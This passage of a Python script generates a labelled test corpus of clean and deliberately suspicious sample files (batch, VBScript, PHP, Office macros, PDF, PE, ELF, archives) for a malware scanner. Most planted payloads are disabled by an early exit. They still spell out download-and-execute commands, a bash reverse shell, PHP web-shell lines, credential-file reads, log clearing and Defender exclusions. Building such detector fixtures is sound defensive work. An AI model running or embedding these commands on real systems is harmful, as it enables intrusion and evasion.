    p.write_text(f"# {INERT}\nreturn\n" + "\n".join(body) + "\n"); record(p, "powershell", "suspicious", planted)

# ===================================================================== 8. Batch
def bat_clean(d):
    src = R.choice(["@echo off\r\nsetlocal\r\nif not exist build mkdir build\r\nxcopy /E /I /Y src build\\src >nul\r\necho Build finished.\r\n",
                    "@echo off\r\nfor %%f in (*.txt) do (\r\n  echo Processing %%f\r\n  type \"%%f\" | find /c /v \"\" \r\n)\r\n"])
    p = d / f"{R.choice(['build', 'count_lines', 'prepare'])}.bat"; p.write_bytes(src.encode()); record(p, "batch", "clean", [])

def bat_susp(d):
    body, planted = [], []
    for c in pick(["certutil", "ps_hidden_enc", "run_key", "bitsadmin", "wevtutil", "copy_masquerade", "defender_excl"]):
        i = ip()
        sev, desc, line, code = {
            "certutil": ("high", "certutil -urlcache 下载并运行 exe", f"certutil -urlcache -split -f http://{i}/svc.exe %TEMP%\\svc.exe && start %TEMP%\\svc.exe", None),
            "ps_hidden_enc": ("high", "powershell -w hidden -ep bypass -enc", "powershell -w hidden -ep bypass -enc " + base64.b64encode(f"echo {INERT}".encode("utf-16le")).decode(), None),
            "run_key": ("low", "reg add ...CurrentVersion\\Run 自启动", f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {w()} /d \"%APPDATA%\\{w()}.exe\" /f", None),
            "bitsadmin": ("high", "bitsadmin /transfer 下载后执行", f"bitsadmin /transfer job /download /priority high http://{i}/p.exe %TEMP%\\p.exe & %TEMP%\\p.exe", None),
            "wevtutil": ("medium", "wevtutil cl 清除事件日志", "wevtutil cl Security", "anti"),
            "copy_masquerade": ("high", "复制 cmd.exe 为伪装名 exe", f"copy C:\\Windows\\System32\\cmd.exe %PROGRAMDATA%\\{w()}host.exe", None),
            "defender_excl": ("medium", "添加 Defender 排除路径", "powershell -c Add-MpPreference -ExclusionPath C:\\Users\\Public", "evasion"),
        }[c]
        body.append(line); planted.append(dict(id=c, sev=sev, desc=desc, code=code))
    p = d / f"{R.choice(['run', 'setup', 'start'])}_{w()}.bat"
    p.write_bytes((f"@echo off\r\nrem {INERT}\r\ngoto :eof\r\n" + "\r\n".join(body) + "\r\n").encode()); record(p, "batch", "suspicious", planted)

# ===================================================================== 9. VBScript
def vbs_clean(d):
    src = 'Option Explicit\r\nDim fso, f, n\r\nSet fso = CreateObject("Scripting.FileSystemObject")\r\nn = 0\r\nFor Each f In fso.GetFolder(".").Files\r\n  n = n + 1\r\nNext\r\nWScript.Echo "Files: " & n\r\n'
    p = d / f"count_{w()}.vbs"; p.write_bytes(src.encode()); record(p, "vbscript", "clean", [])

def vbs_susp(d):
    body, planted = [], []
    for c in pick(["ps_hidden", "mshta", "regsvr32", "run_key", "copy_masquerade", "startup"]):
        i = ip()
        sev, desc, line, code = {
            "ps_hidden": ("medium", "WScript.Shell 以隐藏窗口+Bypass 启动 PowerShell", 'CreateObject("WScript.Shell").Run "powershell -w hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\a.ps1", 0', "ps"),
            "mshta": ("medium", f"mshta http://{i} 远程 HTA", f'CreateObject("WScript.Shell").Run "mshta http://{i}/p.hta", 0', "lolbin"),
            "regsvr32": ("medium", "regsvr32 /i:http scrobj（Squiblydoo）", f'CreateObject("WScript.Shell").Run "regsvr32 /s /n /u /i:http://{i}/s.sct scrobj.dll", 0', "lolbin"),
            "run_key": ("low", "RegWrite 到 CurrentVersion\\Run", f'CreateObject("WScript.Shell").RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{w()}", "wscript.exe C:\\Users\\Public\\x.vbs"', None),
            "copy_masquerade": ("high", "copy wscript.exe 伪装成其他 exe", f'CreateObject("WScript.Shell").Run "cmd /c copy C:\\Windows\\System32\\wscript.exe C:\\Users\\Public\\{w()}.exe", 0', None),
            "startup": ("low", "复制自身到 Startup 启动文件夹", 'CreateObject("Scripting.FileSystemObject").CopyFile WScript.ScriptFullName, CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.vbs"', None),
        }[c]
        body.append(line); planted.append(dict(id=c, sev=sev, desc=desc, code=code))
    p = d / f"{R.choice(['invoice', 'scan', 'notice'])}_{R.randint(1000, 9999)}.vbs"
    p.write_bytes((f"' {INERT}\r\nWScript.Quit\r\n" + "\r\n".join(body) + "\r\n").encode())
    record(p, "vbscript", "suspicious", planted, "mshta 与 regsvr32 在引擎里同属 LOLBIN_DOWNLOAD，只算一项中危")

# ===================================================================== 10. PHP
def php_clean(d):
    src = "<?php\n$name = htmlspecialchars($_POST['name'] ?? '', ENT_QUOTES, 'UTF-8');\n$msg = htmlspecialchars($_POST['message'] ?? '', ENT_QUOTES, 'UTF-8');\nif ($name && $msg) {\n    file_put_contents(__DIR__ . '/messages.log', date('c') . \" $name: $msg\\n\", FILE_APPEND | LOCK_EX);\n    echo 'Thanks!';\n}\n"
    p = d / f"contact_{w()}.php"; p.write_text(src); record(p, "php", "clean", [])

def php_susp(d):
    body, planted = [], []
    for c in pick(["eval_post", "system_get", "assert_cookie", "encoded_blob", "shadow", "miner"]):
        if c == "eval_post": body.append("eval($_POST['c']);"); planted.append(dict(id=c, sev="high", desc="eval($_POST[...]) 一句话木马特征"))
        elif c == "system_get": body.append("system(base64_decode($_GET['x']));"); planted.append(dict(id=c, sev="high", desc="system(base64_decode($_GET)) 命令执行"))
        elif c == "assert_cookie": body.append("assert($_COOKIE['k']);"); planted.append(dict(id=c, sev="high", desc="assert($_COOKIE) 变种"))
        elif c == "encoded_blob":
            inner = pad_payload(f"shell_exec('curl -s http://{ip()}/k | sh'); eval($_REQUEST['z']); // {INERT}", 420)
            body.append(f"$p = '{b64(inner)}';\n// eval(base64_decode($p));"); planted.append(dict(id=c, sev="high", desc="Base64 隐藏载荷（解码后是 eval($_REQUEST) + curl|sh）"))
        elif c == "shadow": body.append("$h = @file_get_contents('/etc/shadow');"); planted.append(dict(id=c, sev="low", desc="读取 /etc/shadow"))
        elif c == "miner": body.append(f"$pool = 'stratum+tcp://{w()}.pool.invalid:3333'; // xmrig cryptonight"); planted.append(dict(id=c, sev="high", desc="矿池地址 stratum+tcp"))
    p = d / f"{R.choice(['wp-cache', 'upload', 'config.bak', 'img'])}-{w()}.php"
    p.write_text(f"<?php\n// {INERT}\nexit;\n" + "\n".join(body) + "\n"); record(p, "php", "suspicious", planted)

# ===================================================================== 11. Office OOXML
def _docx(path, body_xml, doc_rels="", settings_rels="", vba_bin=None):
    main_ct = "application/vnd.ms-word.document.macroEnabled.main+xml" if vba_bin else "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
    X = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    RNS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"'
    ct = (X + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
          '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>'
          + ('<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>' if vba_bin else "") +
          f'<Override PartName="/word/document.xml" ContentType="{main_ct}"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/></Types>')
    files = {"[Content_Types].xml": ct,
             "_rels/.rels": X + f'<Relationships {RNS}><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
             "word/document.xml": X + '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body>' + body_xml + "</w:body></w:document>",
             "word/_rels/document.xml.rels": X + f'<Relationships {RNS}><Relationship Id="rIdS" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>'
                 + ('<Relationship Id="rIdV" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>' if vba_bin else "") + doc_rels + "</Relationships>",
             "word/settings.xml": X + '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">' + ('<w:attachedTemplate r:id="rIdT"/>' if settings_rels else "") + "</w:settings>",
             "docProps/core.xml": X + f'<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator>{w().title()} {w().title()}</dc:creator></cp:coreProperties>'}
    if settings_rels: files["word/_rels/settings.xml.rels"] = X + f"<Relationships {RNS}>" + settings_rels + "</Relationships>"
    if vba_bin: files["word/vbaProject.bin"] = vba_bin
    mkzip(path, files)

def para(t): return f"<w:p><w:r><w:t xml:space=\"preserve\">{t}</w:t></w:r></w:p>"

def office_clean(d):
    title = R.choice(["Quarterly Planning Notes", "Team Offsite Agenda", "Meeting Minutes", "Project Kickoff"])
    body = para(title) + "".join(para(f"{i + 1}. {w().title()} {w()} review - owner {w().title()}") for i in range(R.randint(3, 7)))
    p = d / f"{title.lower().replace(' ', '_')}.docx"; _docx(p, body); record(p, "office_ooxml", "clean", [])

def office_susp(d):
    chosen = pick(["vba_autoexec_shell", "vba_xmlhttp_download", "vba_powershell", "remote_template", "dde_field", "external_ole"])
    planted, vba_lines, doc_rels, set_rels = [], [], "", ""
    body = para(R.choice(["Invoice overdue - enable content to view", "Shipping document", "Salary adjustment 2026"]))
    auto = "vba_autoexec_shell" in chosen
    for c in chosen:
        i, d0 = ip(), dom()
        if c == "vba_autoexec_shell":
            vba_lines.append('Set sh = CreateObject("WScript.Shell")\r\n  sh.Run "cmd /c echo inert", 0\r\n  Shell "cmd /c echo inert", vbHide')
            planted.append(dict(id=c, sev="high", desc="AutoOpen/Document_Open 自动宏调用 WScript.Shell / Shell"))
        elif c == "vba_xmlhttp_download":
            vba_lines.append(f'Set x = CreateObject("MSXML2.XMLHTTP")\r\n  x.Open "GET", "http://{i}/p.bin", False\r\n  x.Send\r\n  Set st = CreateObject("ADODB.Stream")\r\n  st.Open: st.Type = 1: st.Write x.responseBody: st.SaveToFile Environ("TEMP") & "\\p.exe", 2')
            planted.append(dict(id=c, sev="high" if auto else "medium", code="vba", desc=f"宏用 MSXML2.XMLHTTP 从 {i} 下载并 ADODB.Stream 落地"))
        elif c == "vba_powershell":
            vba_lines.append(f'cmd = "powershell -w hidden -nop -c iwr https://{d0}/a.ps1 | iex"\r\n  CreateObject("WScript.Shell").Run cmd, 0')
            planted.append(dict(id=c, sev="high" if auto else "medium", code="vba", desc="宏拼接隐藏窗口 PowerShell 命令"))
        elif c == "remote_template":
            set_rels = f'<Relationship Id="rIdT" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://{i}/templates/{w()}.dotm" TargetMode="External"/>'
            planted.append(dict(id=c, sev="high", desc=f"远程模板注入 attachedTemplate → http://{i}"))
        elif c == "dde_field":
            body += '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k echo FileGuard inert" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
            planted.append(dict(id=c, sev="high", desc="DDEAUTO 字段调用 cmd.exe（只 echo）"))
        elif c == "external_ole":
            doc_rels += f'<Relationship Id="rIdO" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://{d0}/obj.bin" TargetMode="External"/>'
            planted.append(dict(id=c, sev="high", desc=f"外部链接 OLE 对象 → {d0}"))
    vba_bin = None
    if vba_lines:
        entry = R.choice(["AutoOpen", "Document_Open"]) if auto else f"Helper{R.randint(1, 9)}"
        src = f"Sub {entry}()\r\n  Exit Sub ' {INERT}\r\n  " + "\r\n  ".join(vba_lines) + "\r\nEnd Sub\r\n"
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as t: tmp = t.name
        vba.build([("ThisDocument", src, True)], tmp); vba_bin = Path(tmp).read_bytes(); os.unlink(tmp)
    p = d / f"{R.choice(['Invoice', 'Payroll', 'Shipment', 'Contract'])}_{R.randint(10000, 99999)}.{'docm' if vba_bin else 'docx'}"
    _docx(p, body, doc_rels, set_rels, vba_bin)
    record(p, "office_ooxml", "suspicious", planted, "VBA 相关几项在引擎里合并成一条 OFFICE_VBA_MACRO（有自动入口+可疑关键字时为高危）；宏首行 Exit Sub" if vba_lines else "")

# ===================================================================== 12. PDF
def build_pdf(path, text, extra_catalog="", extra_objs=()):
    objs = [f"<< /Type /Catalog /Pages 2 0 R {extra_catalog}>>", "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>"]
    stream = f"BT /F1 18 Tf 72 720 Td ({text}) Tj ET"
    objs += [f"<< /Length {len(stream)} >>\nstream\n{stream}\nendstream", "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"] + list(extra_objs)
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"); offs = []
    for n, o in enumerate(objs, 1):
        offs.append(len(out)); out += f"{n} 0 obj\n{o}\nendobj\n".encode("latin-1")
    x = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode() + b"".join(f"{o:010d} 00000 n \n".encode() for o in offs)
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{x}\n%%EOF\n".encode()
    Path(path).write_bytes(out)

def pdf_clean(d):
    t = R.choice(["Monthly Report", "Course Syllabus", "Event Schedule", "Receipt"])
    p = d / f"{t.lower().replace(' ', '_')}_{R.randint(2024, 2026)}.pdf"; build_pdf(p, f"{t} - {w().title()} {w().title()}"); record(p, "pdf", "clean", [])

def pdf_susp(d):
    chosen = pick(["openaction_js", "aa_js", "launch", "embedded_exe", "obf_js", "uri_ip"])
    planted, cat, objs, names = [], "", [], ""
    state = {"n": 6}
    def add(o):
        objs.append(o); state["n"] += 1; return state["n"] - 1
    js_ref = None
    if any(c in chosen for c in ("openaction_js", "aa_js", "obf_js")):
        code = f"if (false) {{ app.launchURL('http://{ip()}/x', true); }}"
        if "obf_js" in chosen: code += " var s = eval(unescape('%61%70%70%2e%61%6c%65%72%74%28%31%29'));"
        js_ref = add(f"<< /S /JavaScript /JS ({code}) >>")
    for c in chosen:
        if c == "openaction_js": cat += f"/OpenAction {js_ref} 0 R "; planted.append(dict(id=c, sev="medium", code="autojs", desc="/OpenAction 打开即执行 JavaScript（JS 内容是 if(false) 死代码）"))
        elif c == "aa_js": cat += f"/AA << /O {js_ref} 0 R >> "; planted.append(dict(id=c, sev="medium", code="autojs", desc="/AA 附加动作执行 JavaScript"))
        elif c == "obf_js": planted.append(dict(id=c, sev="medium", code="obf", desc="PDF 内 JS 用 eval(unescape(...)) 混淆（解码只是 app.alert(1)）"))
        elif c == "launch":
            lr = add("<< /S /Launch /Win << /F (cmd.exe) /P (/c echo FileGuard inert) >> >>")
            if "openaction_js" not in chosen: cat += f"/OpenAction {lr} 0 R "
            planted.append(dict(id=c, sev="high", desc="/Launch 动作启动 cmd.exe（只 echo）"))
        elif c == "embedded_exe":
            fs = add("<< /Type /EmbeddedFile /Length 24 >>\nstream\nMZ-not-a-real-executable\nendstream")
            spec = add(f"<< /Type /Filespec /F ({w()}_setup.exe) /EF << /F {fs} 0 R >> >>")
            names = f"/Names << /EmbeddedFiles << /Names [({w()}.exe) {spec} 0 R] >> >> "
            planted.append(dict(id=c, sev="low", desc="内嵌附件 /EmbeddedFile（名为 .exe，内容是占位文本）"))
        elif c == "uri_ip":
            i = ip(); add(f"<< /Type /Annot /Subtype /Link /Rect [72 600 300 620] /A << /S /URI /URI (http://{i}:{port()}/verify) >> >>")
            planted.append(dict(id=c, sev="low", desc=f"链接注释指向裸 IP {i}（仅网络指标）"))
    p = d / f"{R.choice(['statement', 'invoice', 'resume', 'notice'])}_{R.randint(100, 999)}.pdf"
    build_pdf(p, "Please enable JavaScript to view this document", cat + names, objs); record(p, "pdf", "suspicious", planted)

# ===================================================================== 15. minimal PE32 (inert: entry = xor eax,eax; ret)
def build_pe(path, imports, sec_names=(".text", ".rdata"), extra_rdata=b"", entropy_section=False, upx_marker=False):
    FA, SA, base, rdata_rva = 0x200, 0x1000, 0x400000, 0x2000
    text = b"\x31\xC0\xC3" + b"\xCC" * 13
    layout = [{"dll": k, "funcs": v} for k, v in imports.items()]
    desc_size = 20 * (len(layout) + 1)
    sizes = [4 * (len(l["funcs"]) + 1) for l in layout]
    ilt_pos = desc_size; iat_pos = ilt_pos + sum(sizes); names_pos = iat_pos + sum(sizes)
    names = bytearray()
    for l in layout:
        l["dn"] = names_pos + len(names); names += l["dll"].encode() + b"\0"
        if len(names) % 2: names += b"\0"
        l["hn"] = []
        for f in l["funcs"]:
            l["hn"].append(names_pos + len(names)); names += b"\0\0" + f.encode() + b"\0"
            if len(names) % 2: names += b"\0"
    descs, ilts, iats = bytearray(), bytearray(), bytearray(); a, b_ = ilt_pos, iat_pos
    for l, sz in zip(layout, sizes):
        th = b"".join(struct.pack("<I", rdata_rva + h) for h in l["hn"]) + b"\0\0\0\0"
        descs += struct.pack("<IIIII", rdata_rva + a, 0, 0, rdata_rva + l["dn"], rdata_rva + b_); ilts += th; iats += th; a += sz; b_ += sz
    descs += b"\0" * 20
    rdata = bytes(descs + ilts + iats + names) + b"\0" * 8 + extra_rdata
    secs = [(sec_names[0], text, 0x60000020), (sec_names[1], rdata, 0x40000040)]
    if entropy_section: secs.append((".data", R.randbytes(12288), 0xC0000040))
    al = lambda x, y: (x + y - 1) // y * y
    raw, rva, hdrs = FA, 0x1000, []
    for nm, data, ch in secs:
        hdrs.append((nm, data, ch, rva, raw)); rva += al(len(data), SA); raw += al(len(data), FA)
    coff = struct.pack("<HHIIIHH", 0x14C, len(secs), int(time.time()) - R.randint(0, 9_000_000), 0, 0, 0xE0, 0x0102)
    dd = [(0, 0)] * 16; dd[1] = (rdata_rva, desc_size); dd[12] = (rdata_rva + iat_pos, sum(sizes))
    opt = struct.pack("<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII", 0x10B, 14, 0, al(len(text), FA), sum(al(len(s[1]), FA) for s in secs[1:]), 0,
                      0x1000, 0x1000, 0x2000, base, SA, FA, 6, 0, 0, 0, 6, 0, 0, rva, FA, 0, 3, 0x8140, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    opt += b"".join(struct.pack("<II", x, y) for x, y in dd)
    sh = b"".join(struct.pack("<8sIIIIIIHHI", nm.encode()[:8], len(data), rv, al(len(data), FA), rw, 0, 0, 0, 0, ch) for nm, data, ch, rv, rw in hdrs)
    dos = bytearray(b"MZ\x90\x00" + b"\0" * 60); struct.pack_into("<I", dos, 0x3C, 0x80)
    stub = b"This program cannot be run in DOS mode.\r\r\n$" + (b"UPX!" if upx_marker else b"")
    out = bytearray((bytes(dos) + stub.ljust(0x40, b"\0") + b"PE\0\0" + coff + opt + sh).ljust(FA, b"\0"))
    for nm, data, ch, rv, rw in hdrs: out += data.ljust(al(len(data), FA), b"\0")
    Path(path).write_bytes(out)

CLEAN_IMPORTS = {"KERNEL32.dll": ["GetStdHandle", "WriteFile", "ExitProcess"]}

def pe_clean(d):
    p = d / f"{R.choice(['hello', 'version', 'tinycalc'])}_{w()}.exe"
    build_pe(p, CLEAN_IMPORTS, extra_rdata=b"Hello from a tiny test program\0"); record(p, "pe_windows", "clean", [], "手工构造的最小 PE32，入口只有 xor eax,eax; ret；无签名（引擎只给 info）")

def pe_susp(d):
    chosen = pick(["injection_apis", "upx_names", "high_entropy", "keylogger_apis", "anti_debug", "miner_string", "double_ext"])
    imps = {"KERNEL32.dll": ["ExitProcess", "GetStdHandle"]}; planted = []; extra = b""; kw = {}
    for c in chosen:
        if c == "injection_apis": imps["KERNEL32.dll"] += ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "OpenProcess"]; planted.append(dict(id=c, sev="medium", code="inj", desc="导入进程注入 API（VirtualAllocEx/WriteProcessMemory/CreateRemoteThread）"))
        elif c == "upx_names": kw["sec_names"] = ("UPX0", "UPX1"); kw["upx_marker"] = True; planted.append(dict(id=c, sev="medium", code="upx", desc="节名 UPX0/UPX1 + UPX! 标记（伪加壳）"))
        elif c == "high_entropy": kw["entropy_section"] = True; planted.append(dict(id=c, sev="medium", code="entropy", desc="随机字节节区，熵≈8（像加密载荷）"))
        elif c == "keylogger_apis": imps["USER32.dll"] = ["GetAsyncKeyState", "SetWindowsHookExA", "GetForegroundWindow"]; planted.append(dict(id=c, sev="medium", code="keylog", desc="导入键盘记录 API（GetAsyncKeyState/SetWindowsHookExA）"))
        elif c == "anti_debug": imps["KERNEL32.dll"] += ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "OutputDebugStringA"]; planted.append(dict(id=c, sev="low", desc="导入反调试 API"))
        elif c == "miner_string": extra += f"stratum+tcp://{w()}.pool.invalid:3333\0xmrig\0".encode(); planted.append(dict(id=c, sev="high", desc="内嵌矿池地址 stratum+tcp:// 与 xmrig"))
        elif c == "double_ext": planted.append(dict(id=c, sev="high", desc="文件名双扩展名伪装（.pdf.exe）"))
    name = f"{R.choice(['Invoice', 'Scan', 'Receipt'])}_{R.randint(1000, 9999)}" + (".pdf.exe" if "double_ext" in chosen else ".exe")
    p = d / name; build_pe(p, imps, extra_rdata=extra, **kw); record(p, "pe_windows", "suspicious", planted, "入口只有 xor eax,eax; ret，导入的 API 从不调用")

# ===================================================================== 16. ELF
def elf_build(path, strings, msg):
    with tempfile.TemporaryDirectory() as t:
        arr = ",\n".join(json.dumps(s) for s in strings) or '""'
        Path(t, "m.c").write_text(f'#include <stdio.h>\n__attribute__((used)) static const char *const fg_inert_strings[] = {{\n{arr}\n}};\nint main(void) {{ puts({json.dumps(msg)}); return 0; }}\n')
        subprocess.run(["gcc", "-O0", "-o", str(path), f"{t}/m.c"], check=True)

def elf_clean(d):
    p = d / f"{R.choice(['greet', 'sysinfo', 'calc'])}-{w()}"; elf_build(p, [], f"hello from {w()}"); record(p, "elf_linux", "clean", [], "gcc 编译的 hello world")

def elf_susp(d):
    chosen = pick(["miner", "upx_marker", "ld_preload", "reverse_shell_str", "curl_pipe_str", "disguised_name"])
    strs, planted = [], []
    for c in chosen:
        i = ip()
        if c == "miner": strs += [f"stratum+tcp://{w()}.pool.invalid:3333", "--algo=cryptonight"]; planted.append(dict(id=c, sev="high", desc="内嵌矿池地址"))
        elif c == "upx_marker": strs.append("UPX!\r\x0c fake packer marker"); planted.append(dict(id=c, sev="medium", code="upx", desc="含 UPX! 加壳标记"))
        elif c == "ld_preload": strs.append("/etc/ld.so.preload"); planted.append(dict(id=c, sev="medium", code="preload", desc="引用 /etc/ld.so.preload"))
        elif c == "reverse_shell_str": strs.append(f"bash -i >& /dev/tcp/{i}/{port()} 0>&1"); planted.append(dict(id=c, sev="critical", desc="内嵌反弹 shell 命令字符串（从不使用）"))
        elif c == "curl_pipe_str": strs.append(f"curl -fsSL http://{i}/u.sh | sh"); planted.append(dict(id=c, sev="high", desc="内嵌 curl|sh 命令字符串（从不使用）"))
        elif c == "disguised_name": planted.append(dict(id=c, sev="high", desc="ELF 伪装成 .pdf 扩展名（扩展名与真实类型不符）"))
    name = f"{R.choice(['report', 'photo', 'notes'])}_{R.randint(10, 99)}" + (".pdf" if "disguised_name" in chosen else "")
    p = d / name; elf_build(p, strs, "ok"); record(p, "elf_linux", "suspicious", planted, "main() 只打印 ok；可疑字符串只是数据")

# ===================================================================== 13/14 archives
LNK_HDR = bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\x00" * 56
def lnk_bytes(): return LNK_HDR + b"C:\\Windows\\System32\\cmd.exe /c start invoice.pdf\0"
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

def tiny_png():
    import zlib
    raw = b"".join(b"\0" + bytes([R.randint(0, 255)] * 3) * 4 for _ in range(4))
    ch = lambda t, x: struct.pack(">I", len(x)) + t + x + struct.pack(">I", zlib.crc32(t + x))
    return b"\x89PNG\r\n\x1a\n" + ch(b"IHDR", struct.pack(">IIBBBBB", 4, 4, 8, 2, 0, 0, 0)) + ch(b"IDAT", zlib.compress(raw)) + ch(b"IEND", b"")

def benign_files(prefix=""):
    return {f"{prefix}notes/{w()}.txt": f"Meeting notes {w()} {w()}\n", f"{prefix}data/{w()}.csv": "date,amount\n2026-01-01,12.5\n2026-02-01,9.0\n",
            f"{prefix}img/{w()}.png": tiny_png()}

def arch_member(c):
    i, d0 = ip(), dom()
    if c == "double_ext": return {f"{R.choice(['invoice', 'contract', 'scan'])}_{R.randint(100, 999)}.pdf.exe": b"placeholder - not executable\n"}, dict(sev="high", desc="成员双扩展名 .pdf.exe（内容是占位文本）")
    if c == "rtlo": return {f"photo_{R.randint(10, 99)}\u202egpj.scr": b"placeholder\n"}, dict(sev="high", desc="成员文件名含 RTLO 字符（显示像 .jpg，实为 .scr）")
    if c == "lnk": return {f"{w()}_document.lnk": lnk_bytes()}, dict(sev="medium", code="lnk", desc="压缩包内藏 .lnk 快捷方式")
    if c == "pe_as_jpg":
        with tempfile.NamedTemporaryFile(delete=False) as t: tmp = t.name
        build_pe(tmp, CLEAN_IMPORTS); b = Path(tmp).read_bytes(); os.unlink(tmp)
        return {f"IMG_{R.randint(1000, 9999)}.jpg": b}, dict(sev="high", desc="PE 可执行文件伪装成 .jpg（PE 本身是无害最小程序）")
    if c == "eicar": return {"eicar_test.com": EICAR}, dict(sev="critical", desc="EICAR 标准杀毒测试文件（无害，ClamAV/YARA 必报）")
    if c == "curl_script": return {f"tools/{w()}.sh": f"#!/bin/sh\nexit 0\ncurl -fsSL https://{d0}/x | sh\n"}, dict(sev="high", desc="内含 curl|sh 下载执行脚本")
    if c == "js_dropper":
        b = jsb_platform_dropper(); return {f"{w()}.js": js_dead([b["js"]])}, dict(sev="high", desc="内含按平台分支下载落地的 JS")
    if c == "ps_iex": return {f"{w()}.ps1": f"return\nIEX (New-Object Net.WebClient).DownloadString('http://{i}/a')\n"}, dict(sev="high", desc="内含 IEX DownloadString 的 PowerShell")
    raise KeyError(c)
ARCH_POOL = ["double_ext", "rtlo", "lnk", "pe_as_jpg", "eicar", "curl_script", "js_dropper", "ps_iex"]

def _zip_bytes(files):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for k, v in files.items(): z.writestr(k, v)
    return b.getvalue()

def _tgz_bytes(files):
    b = io.BytesIO()
    with tarfile.open(fileobj=b, mode="w:gz") as tf:
        for k, v in files.items():
            v = v.encode() if isinstance(v, str) else v
            ti = tarfile.TarInfo(k); ti.size = len(v); tf.addfile(ti, io.BytesIO(v))
    return b.getvalue()

def zip_clean(d):
    files = benign_files(f"{w()}_{R.randint(2024, 2026)}/"); files[f"archive/{w()}_old.zip"] = _zip_bytes(benign_files())
    p = d / f"{w()}_photos_and_notes.zip"; mkzip(p, files); record(p, "zip_archive", "clean", [], "含一层嵌套 zip，内容全是文本/CSV/PNG")

def zip_susp(d):
    files, planted, nested = benign_files(), [], {}
    for c in pick(ARCH_POOL):
        m, meta = arch_member(c); inner = R.random() < 0.35
        (nested if inner else files).update(m); planted.append(dict(id=c, **meta)); planted[-1]["desc"] += "（内层 zip）" if inner else ""
    if nested: files[f"more/{w()}.zip"] = _zip_bytes(nested)
    p = d / f"{R.choice(['documents', 'scans', 'shared', 'delivery'])}_{R.randint(100, 999)}.zip"; mkzip(p, files); record(p, "zip_archive", "suspicious", planted)

def nested_build(path, layers):
    """outer 7z (layer 1) -> tar.gz (layer 2) -> zip (layer 3)"""
    z = _zip_bytes(layers.get(3) or {"readme.txt": "inner\n"})
    t = _tgz_bytes({**layers.get(2, {}), f"{w()}_inner.zip": z})
    with tempfile.TemporaryDirectory() as tdir:
        for k, v in {**layers.get(1, {}), f"bundle_{w()}.tar.gz": t}.items():
            fp = Path(tdir, k); fp.parent.mkdir(parents=True, exist_ok=True); fp.write_bytes(v.encode() if isinstance(v, str) else v)
        subprocess.run(["7z", "a", "-bd", "-y", str(path), "."], cwd=tdir, check=True, capture_output=True)

def nested_clean(d):
    p = d / f"{w()}_project_backup.7z"
    nested_build(p, {1: benign_files(), 2: {"src/app.py": "print('hello')\n", "src/README.md": "# app\n"}, 3: benign_files("old/")})
    record(p, "nested_archive", "clean", [], "7z → tar.gz → zip 三层，内容全是普通文件")

def nested_susp(d):
    layers, planted = {1: benign_files(), 2: {}, 3: {}}, []
    for c in pick(ARCH_POOL):
        m, meta = arch_member(c); depth = R.choice([1, 2, 3]); layers[depth].update(m)
        planted.append(dict(id=c, **meta)); planted[-1]["desc"] += f"（第 {depth} 层：{['', '7z', 'tar.gz', 'zip'][depth]}）"
    p = d / f"{R.choice(['release', 'backup', 'assets'])}_{R.randint(100, 999)}.7z"; nested_build(p, layers); record(p, "nested_archive", "suspicious", planted)

# ===================================================================== 17. Debian .deb
def deb_build(path, pkg, version, postinst, data_files):
    with tempfile.TemporaryDirectory() as t:
        root = Path(t, "root"); (root / "DEBIAN").mkdir(parents=True)
        (root / "DEBIAN/control").write_text(f"Package: {pkg}\nVersion: {version}\nArchitecture: all\nMaintainer: {w().title()} <{w()}@example.com>\nDescription: {w()} helper tool\n {INERT}\n")
        if postinst: (root / "DEBIAN/postinst").write_text(postinst); os.chmod(root / "DEBIAN/postinst", 0o755)
